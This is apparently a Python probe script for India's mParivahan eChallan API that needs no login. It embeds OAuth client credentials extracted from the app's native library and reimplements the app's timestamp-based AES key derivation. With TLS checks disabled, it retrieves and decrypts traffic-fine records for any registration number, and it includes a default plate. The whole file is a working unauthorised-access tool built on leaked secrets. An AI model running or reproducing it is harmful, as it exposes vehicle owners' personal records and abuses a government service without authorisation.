#!/usr/bin/env python3
"""
mParivahan — eChallan endpoint probe (no login required experiment).

Usage:
    python3 try_echallan.py <RC_NUMBER>           # fetch token + try eChallan
    python3 try_echallan.py <RC_NUMBER> <TOKEN>   # use existing Bearer token
"""

import base64
import json
import sys
import time

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

try:
    import ssl
    import requests
    from requests.adapters import HTTPAdapter
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    class _TLSAdapter(HTTPAdapter):
        def init_poolmanager(self, *a, **kw):
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            ctx.set_ciphers(
                "ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:"
                "ECDH+AES128:DH+AES:RSA+AESGCM:RSA+AES:!aNULL:!MD5:!DSS"
            )
            kw["ssl_context"] = ctx
            super().init_poolmanager(*a, **kw)

    _SESSION = requests.Session()
    _SESSION.mount("https://", _TLSAdapter())
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    _SESSION = None

# ── endpoints (from libsystem-arch.so) ───────────────────────────────────────
OAUTH_URL      = "https://delhigw.napix.gov.in/nic/parivahan/oauth2/token"
ECHALLAN_BASE  = "https://delhigw.napix.gov.in/nic/parivahan/mparivahan/wrapperapi/echallan/echallanapi/"
ECHALLAN_EP    = "get-challans-detail"

# ── mParivahan app OAuth credentials (from native lib) ───────────────────────
CLIENT_ID      = "b91c303443f61b37106750823881cd2f"
CLIENT_SECRET  = "de83eeeb148878ae375f28756492e8a0"

# ── AES key derivation (getResUrl + getPayment, verified via objdump) ─────────
PAYMENT_SUFFIX = "!~)#@*&^"

def derive_key(ts: str) -> bytes:
    rev  = ts[::-1]
    part = rev[:4] + rev[len(rev) - 4:]
    return (part + PAYMENT_SUFFIX).encode("utf-8")

def encrypt_body(plain: str, ts: str) -> str:
    ct    = AES.new(derive_key(ts), AES.MODE_ECB).encrypt(pad(plain.encode(), 16))
    return base64.b64encode(base64.b64encode(ct)).decode()

def decrypt_response(data_b64: str, ts: str) -> str:
    try:
        ct = base64.b64decode(base64.b64decode(data_b64))
        pt = unpad(AES.new(derive_key(ts), AES.MODE_ECB).decrypt(ct), 16)
        return pt.decode("utf-8")
    except Exception as e:
        return f"<decryption failed: {e}>"

# ── OAuth token fetch ─────────────────────────────────────────────────────────
def fetch_token():
    print(">> Fetching OAuth token (client_credentials) ...")
    resp = _SESSION.post(OAUTH_URL, data={
        "grant_type":    "client_credentials",
        "scope":         "napix",
        "client_id":     CLIENT_ID,
        "client_secret": CLIENT_SECRET,
    }, timeout=15, verify=False)
    print(f"   OAuth HTTP {resp.status_code}")
    try:
        rj = resp.json()
        token = rj.get("access_token")
        if token:
            print(f"   Token: {token[:50]}...")
            return token
        print("   No access_token in response:", json.dumps(rj, indent=2))
        return None
    except Exception:
        print("   Raw:", resp.text[:300])
        return None

# ── eChallan get-challans-detail ──────────────────────────────────────────────
def try_echallan(rc_number: str, bearer: str):
    ts = str(int(time.time() * 1000))

    plain = json.dumps({
        "entity_type":  "RC",
        "entity_value": rc_number,
        "offset":       1,
        "engine5_no":   "",
        "chassis5_no":  "",
        "did":          "0000000000000000",
        "mid":          "0000000000",
        "tid":          "",
        "recordId":     1,
    }, separators=(",", ":"))

    body = json.dumps({"data": encrypt_body(plain, ts)})

    headers = {
        "Content-Type": "application/json",
        "Accept":       "application/json",
        "timestamp":    ts,
        "Param2":       "2.0.135",
        "Param1":       "",
    }
    if bearer:
        headers["Authorization"] = f"Bearer {bearer}"

    url = ECHALLAN_BASE + ECHALLAN_EP
    print(f"\n{'='*60}")
    print(f"  RC        : {rc_number}")
    print(f"  ENDPOINT  : {url}")
    print(f"  AES KEY   : {derive_key(ts).decode()}")
    print(f"  PLAIN BODY: {plain}")
    print(f"{'='*60}\n")

    if not HAS_REQUESTS:
        print("(requests not installed — paste the curl below)\n")
        print(f"curl -X POST '{url}' \\")
        for k, v in headers.items():
            print(f"  -H '{k}: {v}' \\")
        print(f"  -d '{body}'")
        return

    print(">> Firing eChallan request ...")
    try:
        resp = _SESSION.post(url, headers=headers, data=body, timeout=15, verify=False)
        print(f"HTTP {resp.status_code}\n")
        try:
            rj = resp.json()
            print("Encrypted response:", json.dumps(rj, indent=2))
            if "data" in rj:
                print("\nDECRYPTED:", decrypt_response(rj["data"], ts))
        except Exception:
            print("Raw response:", resp.text[:500])
    except requests.exceptions.Timeout:
        print("ERROR: timed out")
    except Exception as e:
        print(f"ERROR: {e}")


if __name__ == "__main__":
    rc     = sys.argv[1] if len(sys.argv) > 1 else "WB74AN9717"
    bearer = sys.argv[2] if len(sys.argv) > 2 else ""

    if not bearer:
        bearer = fetch_token() or ""

    try_echallan(rc, bearer)
